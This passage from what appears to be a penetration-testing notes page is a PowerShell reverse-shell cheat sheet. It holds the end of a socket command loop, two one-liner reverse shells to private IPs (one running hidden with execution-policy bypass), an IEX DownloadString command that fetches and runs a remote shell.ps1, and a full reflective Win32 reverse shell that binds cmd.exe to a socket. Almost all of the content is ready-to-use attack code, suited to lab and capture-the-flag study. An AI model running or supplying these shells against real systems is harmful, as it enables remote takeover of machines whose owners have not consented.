</span></span><span class="line"><span class="cl">				<span class="nv">$res</span> <span class="p">=</span> <span class="p">(&amp;</span><span class="s2">&#34;</span><span class="nv">$out</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$args</span><span class="s2">&#34;</span><span class="p">)</span> <span class="p">|</span> <span class="nb">out-string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$res</span> <span class="p">=</span> <span class="p">(&amp;</span><span class="s2">&#34;</span><span class="nv">$out</span><span class="s2">&#34;</span><span class="p">)</span> <span class="p">|</span> <span class="nb">out-string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$res</span> <span class="o">-ne</span> <span class="vm">$null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$writer</span><span class="p">.</span><span class="py">WriteLine</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">While</span> <span class="p">(!</span><span class="nv">$out</span><span class="p">.</span><span class="py">equals</span><span class="p">(</span><span class="s2">&#34;exit&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nv">$writer</span><span class="p">.</span><span class="py">close</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$socket</span><span class="p">.</span><span class="py">close</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$stream</span><span class="p">.</span><span class="py">Dispose</span><span class="p">()</span></span></span></code></pre></div>
  </figure>
</div>
<ul>
<li>One liner shell :</li>
</ul>



<div class="expressive-code">
  <figure class="frame is-terminal not-content">
  <figcaption class="header">
    <span class="title"></span>
  </figcaption>
  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-c</span> <span class="s2">&#34;</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient(&#39;10.10.10.10&#39;,4444);</span><span class="nv">$s</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$b</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$s</span><span class="s2">.Read(</span><span class="nv">$b</span><span class="s2">, 0, </span><span class="nv">$b</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$b</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sb</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sb2</span><span class="s2"> = </span><span class="nv">$sb</span><span class="s2"> + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;</span><span class="nv">$sbt</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sb2</span><span class="s2">);</span><span class="nv">$s</span><span class="s2">.Write(</span><span class="nv">$sbt</span><span class="s2">,0,</span><span class="nv">$sbt</span><span class="s2">.Length);</span><span class="nv">$s</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()&#34;</span></span></span></code></pre></div>
  </figure>
</div>
<ul>
<li>One liner shell :</li>
</ul>



<div class="expressive-code">
  <figure class="frame is-terminal not-content">
  <figcaption class="header">
    <span class="title"></span>
  </figcaption>
  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-NoP</span> <span class="n">-NonI</span> <span class="n">-W</span> <span class="n">Hidden</span> <span class="n">-Exec</span> <span class="n">Bypass</span> <span class="n">-Command</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="py">Sockets</span><span class="p">.</span><span class="py">TCPClient</span><span class="p">(</span><span class="s2">&#34;10.10.15.18&#34;</span><span class="p">,</span><span class="mf">4444</span><span class="p">);</span><span class="nv">$s</span><span class="p">=</span><span class="nv">$client</span><span class="p">.</span><span class="py">GetStream</span><span class="p">();[</span><span class="no">byte[]</span><span class="p">]</span><span class="nv">$b</span><span class="p">=</span><span class="mf">0</span><span class="p">.</span><span class="mf">.65535</span><span class="p">|%{</span><span class="mf">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$s</span><span class="p">.</span><span class="py">Read</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$b</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="mf">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="py">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sb</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="mf">2</span><span class="p">&gt;&amp;</span><span class="mf">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sb2</span><span class="p">=</span><span class="nv">$sb</span><span class="p">+</span><span class="s2">&#34;PS &#34;</span><span class="p">+(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span><span class="p">+</span><span class="s2">&#34;&gt; &#34;</span><span class="p">;</span><span class="nv">$sbt</span> <span class="p">=</span> <span class="p">([</span><span class="no">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">).</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$sb2</span><span class="p">);</span><span class="nv">$s</span><span class="p">.</span><span class="py">Write</span><span class="p">(</span><span class="nv">$sbt</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="nv">$sbt</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$s</span><span class="p">.</span><span class="py">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span></span></span></code></pre></div>
  </figure>
</div>
<ul>
<li>Download :</li>
</ul>



<div class="expressive-code">
  <figure class="frame is-terminal not-content">
  <figcaption class="header">
    <span class="title"></span>
  </figcaption>
  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">powershell -c <span class="s2">&#34;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://10.8.3.12:8080/shell.ps1&#39;)&#34;</span></span></span></code></pre></div>
  </figure>
</div>



<div class="expressive-code">
  <figure class="frame is-terminal not-content">
  <figcaption class="header">
    <span class="title"></span>
  </figcaption>
  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="cm">&lt;#
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">DynWin32-ReverseShell.ps1 is a reverse shell based on dynamically looked up Win32 API calls.
</span></span></span><span class="line"><span class="cl"><span class="cm">The script uses reflection to obtain access to GetModuleHandle, GetProcAddress and CreateProcess.
</span></span></span><span class="line"><span class="cl"><span class="cm">Afterwards it uses GetModuleHandle and GetProcAddress to resolve the required WSA functions
</span></span></span><span class="line"><span class="cl"><span class="cm">from ws2_32.dll.
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">This script should be used for educational purposes only (and maybe while playing CTF :D).
</span></span></span><span class="line"><span class="cl"><span class="cm">It was only tested on Windows 10 (x64) and is probably not stable or portable. It&#39;s only
</span></span></span><span class="line"><span class="cl"><span class="cm">purpose is to demonstrate the usage of reflective lookups of Win32 API calls. See it as
</span></span></span><span class="line"><span class="cl"><span class="cm">just a silly experiment :)
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">Author: Tobias Neitzel (@qtc_de)
</span></span></span><span class="line"><span class="cl"><span class="cm">License: GPL-3.0 License
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">#&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$IP</span> <span class="p">=</span> <span class="s2">&#34;10.8.3.12&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$PORT</span> <span class="p">=</span> <span class="mf">4242</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">filter</span><span class="w"> </span><span class="nb">Get-Type</span> <span class="p">([</span><span class="no">string</span><span class="p">]</span><span class="nv">$dllName</span><span class="p">,[</span><span class="no">string</span><span class="p">]</span><span class="nv">$typeName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nv">$_</span><span class="p">.</span><span class="py">GlobalAssemblyCache</span> <span class="o">-And</span> <span class="nv">$_</span><span class="p">.</span><span class="py">Location</span><span class="p">.</span><span class="py">Split</span><span class="p">(</span><span class="s1">&#39;\\&#39;</span><span class="p">)[</span><span class="mf">-1</span><span class="p">].</span><span class="py">Equals</span><span class="p">(</span><span class="nv">$dllName</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_</span><span class="p">.</span><span class="py">GetType</span><span class="p">(</span><span class="nv">$typeName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span><span class="w"> </span><span class="nb">Get-Function</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">Param</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="no">string</span><span class="p">]</span> <span class="nv">$module</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="no">string</span><span class="p">]</span> <span class="nv">$function</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="vm">$null</span> <span class="o">-eq</span> <span class="nv">$GetModuleHandle</span><span class="p">)</span> <span class="o">-or</span> <span class="p">(</span><span class="vm">$null</span> <span class="o">-eq</span> <span class="nv">$GetProcAddress</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="s2">&#34;Error: GetModuleHandle and GetProcAddress must be initialized first!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$moduleHandle</span> <span class="p">=</span> <span class="nv">$GetModuleHandle</span><span class="p">.</span><span class="py">Invoke</span><span class="p">(</span><span class="vm">$null</span><span class="p">,</span> <span class="vm">@</span><span class="p">(</span><span class="nv">$module</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$GetProcAddress</span><span class="p">.</span><span class="py">Invoke</span><span class="p">(</span><span class="vm">$null</span><span class="p">,</span> <span class="vm">@</span><span class="p">(</span><span class="nv">$moduleHandle</span><span class="p">,</span> <span class="nv">$function</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span><span class="w"> </span><span class="nb">Get-Delegate</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">Param</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="nb">Parameter</span><span class="p">(</span><span class="na">Position</span> <span class="p">=</span> <span class="mf">0</span><span class="p">,</span> <span class="na">Mandatory</span> <span class="p">=</span> <span class="vm">$True</span><span class="p">)]</span> <span class="p">[</span><span class="no">IntPtr</span><span class="p">]</span> <span class="nv">$funcAddr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="nb">Parameter</span><span class="p">(</span><span class="na">Position</span> <span class="p">=</span> <span class="mf">1</span><span class="p">,</span> <span class="na">Mandatory</span> <span class="p">=</span> <span class="vm">$True</span><span class="p">)]</span> <span class="p">[</span><span class="no">Type[]</span><span class="p">]</span> <span class="nv">$argTypes</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="nb">Parameter</span><span class="p">(</span><span class="na">Position</span> <span class="p">=</span> <span class="mf">2</span><span class="p">)]</span> <span class="p">[</span><span class="no">Type</span><span class="p">]</span> <span class="nv">$retType</span> <span class="p">=</span> <span class="p">[</span><span class="no">Void</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$type</span> <span class="p">=</span> <span class="p">[</span><span class="no">AppDomain</span><span class="p">]::</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="py">DefineDynamicAssembly</span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Reflection</span><span class="p">.</span><span class="py">AssemblyName</span><span class="p">(</span><span class="s1">&#39;QD&#39;</span><span class="p">)),</span> <span class="p">[</span><span class="no">System.Reflection.Emit.AssemblyBuilderAccess</span><span class="p">]::</span><span class="n">Run</span><span class="p">).</span>
</span></span><span class="line"><span class="cl">    <span class="n">DefineDynamicModule</span><span class="p">(</span><span class="s1">&#39;QM&#39;</span><span class="p">,</span> <span class="vm">$false</span><span class="p">).</span>
</span></span><span class="line"><span class="cl">    <span class="n">DefineType</span><span class="p">(</span><span class="s1">&#39;QT&#39;</span><span class="p">,</span> <span class="s1">&#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;</span><span class="p">,</span> <span class="p">[</span><span class="no">System.MulticastDelegate</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$type</span><span class="p">.</span><span class="py">DefineConstructor</span><span class="p">(</span><span class="s1">&#39;RTSpecialName, HideBySig, Public&#39;</span><span class="p">,[</span><span class="no">System.Reflection.CallingConventions</span><span class="p">]::</span><span class="n">Standard</span><span class="p">,</span> <span class="nv">$argTypes</span><span class="p">).</span><span class="py">SetImplementationFlags</span><span class="p">(</span><span class="s1">&#39;Runtime, Managed&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$type</span><span class="p">.</span><span class="py">DefineMethod</span><span class="p">(</span><span class="s1">&#39;Invoke&#39;</span><span class="p">,</span> <span class="s1">&#39;Public, HideBySig, NewSlot, Virtual&#39;</span><span class="p">,</span> <span class="nv">$retType</span><span class="p">,</span> <span class="nv">$argTypes</span><span class="p">).</span><span class="py">SetImplementationFlags</span><span class="p">(</span><span class="s1">&#39;Runtime, Managed&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$delegate</span> <span class="p">=</span> <span class="nv">$type</span><span class="p">.</span><span class="py">CreateType</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="no">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">(</span><span class="nv">$funcAddr</span><span class="p">,</span> <span class="nv">$delegate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Obtain the required types from the already loaded System.dll assembly</span>
</span></span><span class="line"><span class="cl"><span class="nv">$assemblies</span> <span class="p">=</span> <span class="p">[</span><span class="no">AppDomain</span><span class="p">]::</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="py">GetAssemblies</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nv">$unsafeMethodsType</span> <span class="p">=</span> <span class="nv">$assemblies</span> <span class="p">|</span> <span class="nb">Get-Type</span> <span class="s1">&#39;System.dll&#39;</span> <span class="s1">&#39;Microsoft.Win32.UnsafeNativeMethods&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$nativeMethodsType</span> <span class="p">=</span> <span class="nv">$assemblies</span> <span class="p">|</span> <span class="nb">Get-Type</span> <span class="s1">&#39;System.dll&#39;</span> <span class="s1">&#39;Microsoft.Win32.NativeMethods&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$startupInformationType</span> <span class="p">=</span>  <span class="nv">$assemblies</span> <span class="p">|</span> <span class="nb">Get-Type</span> <span class="s1">&#39;System.dll&#39;</span> <span class="s1">&#39;Microsoft.Win32.NativeMethods+STARTUPINFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$processInformationType</span> <span class="p">=</span>  <span class="nv">$assemblies</span> <span class="p">|</span> <span class="nb">Get-Type</span> <span class="s1">&#39;System.dll&#39;</span> <span class="s1">&#39;Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Obtain the methods: GetModuleHandle, GetProcAddress and CreateProcess</span>
</span></span><span class="line"><span class="cl"><span class="nv">$GetModuleHandle</span> <span class="p">=</span> <span class="nv">$unsafeMethodsType</span><span class="p">.</span><span class="py">GetMethod</span><span class="p">(</span><span class="s1">&#39;GetModuleHandle&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$GetProcAddress</span> <span class="p">=</span> <span class="nv">$unsafeMethodsType</span><span class="p">.</span><span class="py">GetMethod</span><span class="p">(</span><span class="s1">&#39;GetProcAddress&#39;</span><span class="p">,</span> <span class="p">[</span><span class="no">reflection.bindingflags</span><span class="p">]</span><span class="s1">&#39;Public,Static&#39;</span><span class="p">,</span> <span class="vm">$null</span><span class="p">,</span> <span class="p">[</span><span class="no">System.Reflection.CallingConventions</span><span class="p">]::</span><span class="n">Any</span><span class="p">,</span> <span class="vm">@</span><span class="p">([</span><span class="no">System.IntPtr], [string</span><span class="p">]),</span> <span class="vm">$null</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CreateProcess</span> <span class="p">=</span> <span class="nv">$nativeMethodsType</span><span class="p">.</span><span class="py">GetMethod</span><span class="p">(</span><span class="s2">&#34;CreateProcess&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Dynamically lookup the required WSA function addresses from ws2_23.dll</span>
</span></span><span class="line"><span class="cl"><span class="nv">$ConnectAddr</span> <span class="p">=</span> <span class="nb">Get-Function</span> <span class="s2">&#34;ws2_32.dll&#34;</span> <span class="s2">&#34;connect&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$WSASocketAddr</span> <span class="p">=</span> <span class="nb">Get-Function</span> <span class="s2">&#34;ws2_32.dll&#34;</span> <span class="s2">&#34;WSASocketA&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$WSAStartupAddr</span> <span class="p">=</span> <span class="nb">Get-Function</span> <span class="s2">&#34;ws2_32.dll&#34;</span> <span class="s2">&#34;WSAStartup&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CloseSocketAddr</span> <span class="p">=</span> <span class="nb">Get-Function</span> <span class="s2">&#34;ws2_32.dll&#34;</span> <span class="s2">&#34;closesocket&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Create delegate types for the dynamically looked up WSA function addresses</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CloseSocket</span> <span class="p">=</span> <span class="nb">Get-Delegate</span> <span class="nv">$CloseSocketAddr</span> <span class="vm">@</span><span class="p">([</span><span class="no">IntPtr</span><span class="p">])</span> <span class="p">([</span><span class="no">Int</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nv">$WSAStartup</span> <span class="p">=</span> <span class="nb">Get-Delegate</span> <span class="nv">$WSAStartupAddr</span> <span class="vm">@</span><span class="p">([</span><span class="no">Int16], [Byte[]</span><span class="p">])</span> <span class="p">([</span><span class="no">Int</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Connect</span> <span class="p">=</span> <span class="nb">Get-Delegate</span> <span class="nv">$ConnectAddr</span> <span class="vm">@</span><span class="p">([</span><span class="no">IntPtr], [Byte[]], [Int</span><span class="p">])</span> <span class="p">([</span><span class="no">Int</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nv">$WSASocket</span> <span class="p">=</span> <span class="nb">Get-Delegate</span> <span class="nv">$WSASocketAddr</span> <span class="vm">@</span><span class="p">([</span><span class="no">System.Net.Sockets.AddressFamily], [System.Net.Sockets.SocketType], [System.Net.Sockets.ProtocolType], [IntPtr], [UInt32], [Int</span><span class="p">])</span> <span class="p">([</span><span class="no">IntPtr</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Call WSAStartup to initialize WSA and create a WSA socket</span>
</span></span><span class="line"><span class="cl"><span class="nv">$WSAStartup</span><span class="p">.</span><span class="py">Invoke</span><span class="p">(</span><span class="n">0x202</span><span class="p">,</span> <span class="p">[</span><span class="no">System.Byte[]</span><span class="p">]::</span><span class="n">CreateInstance</span><span class="p">([</span><span class="no">System.Byte</span><span class="p">],</span> <span class="n">0x200</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nv">$hSock</span> <span class="p">=</span> <span class="nv">$WSASocket</span><span class="p">.</span><span class="py">Invoke</span><span class="p">([</span><span class="no">System.Net.Sockets.AddressFamily</span><span class="p">]::</span><span class="n">InterNetwork</span><span class="p">,</span> <span class="p">[</span><span class="no">System.Net.Sockets.SocketType</span><span class="p">]::</span><span class="n">Stream</span><span class="p">,</span> <span class="p">[</span><span class="no">System.Net.Sockets.ProtocolType</span><span class="p">]::</span><span class="n">IP</span><span class="p">,</span> <span class="p">[</span><span class="no">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="mf">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Prepare the sockaddr_in structure in form of a byte array and use it to connect to the target</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">Byte[]</span><span class="p">]</span> <span class="nv">$ip</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.BitConverter</span><span class="p">]::</span><span class="n">GetBytes</span><span class="p">([</span><span class="no">System.Convert</span><span class="p">]::</span><span class="n">ToUInt32</span><span class="p">([</span><span class="no">ipaddress</span><span class="p">]::</span><span class="n">Parse</span><span class="p">(</span><span class="nv">$IP</span><span class="p">).</span><span class="n">Address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">Byte[]</span><span class="p">]</span> <span class="nv">$port</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.BitConverter</span><span class="p">]::</span><span class="n">GetBytes</span><span class="p">([</span><span class="no">System.Convert</span><span class="p">]::</span><span class="n">ToUInt16</span><span class="p">(</span><span class="nv">$PORT</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">Array</span><span class="p">]::</span><span class="n">Reverse</span><span class="p">(</span><span class="nv">$port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">Byte[]</span><span class="p">]</span> <span class="nv">$buffer</span> <span class="p">=</span> <span class="n">0x02</span><span class="p">,</span> <span class="n">0x00</span> <span class="p">+</span> <span class="nv">$port</span> <span class="p">+</span> <span class="nv">$ip</span> <span class="p">+</span> <span class="n">0x00</span><span class="p">,</span> <span class="n">0x00</span><span class="p">,</span> <span class="n">0x00</span><span class="p">,</span> <span class="n">0x00</span><span class="p">,</span> <span class="n">0x00</span><span class="p">,</span> <span class="n">0x00</span><span class="p">,</span> <span class="n">0x00</span><span class="p">,</span> <span class="n">0x00</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$Connect</span><span class="p">.</span><span class="py">Invoke</span><span class="p">(</span><span class="nv">$hSock</span><span class="p">,</span> <span class="nv">$buffer</span><span class="p">,</span> <span class="nv">$buffer</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Create instances of the STARTUP_INFORMATION and PROCESS_INFORMATION structures</span>
</span></span><span class="line"><span class="cl"><span class="nv">$startupInformation</span> <span class="p">=</span> <span class="nv">$startupInformationType</span><span class="p">.</span><span class="py">GetConstructors</span><span class="p">().</span><span class="py">Invoke</span><span class="p">(</span><span class="vm">$null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$processInformation</span> <span class="p">=</span> <span class="nv">$processInformationType</span><span class="p">.</span><span class="py">GetConstructors</span><span class="p">().</span><span class="py">Invoke</span><span class="p">(</span><span class="vm">$null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Redirect stdin, stdout and stderr to the socket within of STARTUP_INFORMATION</span>
</span></span><span class="line"><span class="cl"><span class="nv">$safeHandle</span> <span class="p">=</span> <span class="p">[</span><span class="no">Microsoft.Win32.SafeHandles.SafeFileHandle</span><span class="p">]::</span><span class="n">new</span><span class="p">(</span><span class="nv">$hSock</span><span class="p">,</span> <span class="vm">$true</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$startupInformation</span><span class="p">.</span><span class="py">dwFlags</span> <span class="p">=</span> <span class="n">0x00000100</span>
</span></span><span class="line"><span class="cl"><span class="nv">$startupInformation</span><span class="p">.</span><span class="py">hStdInput</span> <span class="p">=</span> <span class="nv">$safeHandle</span>
</span></span><span class="line"><span class="cl"><span class="nv">$startupInformation</span><span class="p">.</span><span class="py">hStdOutput</span> <span class="p">=</span> <span class="nv">$safeHandle</span>
</span></span><span class="line"><span class="cl"><span class="nv">$startupInformation</span><span class="p">.</span><span class="py">hStdError</span> <span class="p">=</span> <span class="nv">$safeHandle</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Create a new cmd.exe process with redirected output as specified above</span>
</span></span><span class="line"><span class="cl"><span class="nv">$cmd</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Text.StringBuilder</span><span class="p">]::</span><span class="n">new</span><span class="p">(</span><span class="s2">&#34;C:\\Windows\\System32\\cmd.exe&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CreateProcess</span><span class="p">.</span><span class="py">Invoke</span><span class="p">(</span><span class="vm">$null</span><span class="p">,</span> <span class="vm">@</span><span class="p">(</span><span class="vm">$null</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">,</span> <span class="vm">$null</span><span class="p">,</span> <span class="vm">$null</span><span class="p">,</span> <span class="vm">$true</span><span class="p">,</span> <span class="n">0x08000000</span><span class="p">,</span> <span class="p">[</span><span class="no">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,</span> <span class="vm">$null</span><span class="p">,</span> <span class="nv">$startupInformation</span><span class="p">,</span> <span class="nv">$processInformation</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Finally close the socket handle that is owned by the script</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CloseSocket</span><span class="p">.</span><span class="py">Invoke</span><span class="p">(</span><span class="nv">$hSock</span><span class="p">)</span></span></span></code></pre></div>
  </figure>
</div>

			<div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between">
				</div>
			<div class="page-nav d-flex flex-column flex-sm-row">
	
	<div class="card w-100">
			<div class="card-body d-flex">
				<div class="d-flex flex-column justify-content-center">
					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
						<path d="M5 12l14 0"></path>
						<path d="M5 12l6 6"></path>
						<path d="M5 12l6 -6"></path>
				 	</svg>
				</div>
				<div class="d-flex flex-column">
					<div class="text-body-secondary">Prev</div>
					<a href="/notes/lab/htb/pov/" class="stretched-link text-reset text-decoration-none">POV</a>
				</div>
			</div>
		</div>
	<div class="m-2"></div>
	<div class="card text-end w-100">
			<div class="card-body d-flex justify-content-end">
				<div class="d-flex flex-column">
					<div class="text-body-secondary">Next</div>
					<a href="/notes/ad/tools/powerview/" class="stretched-link text-reset text-decoration-none">Powerview</a>
				</div>
				<div class="d-flex flex-column justify-content-center">
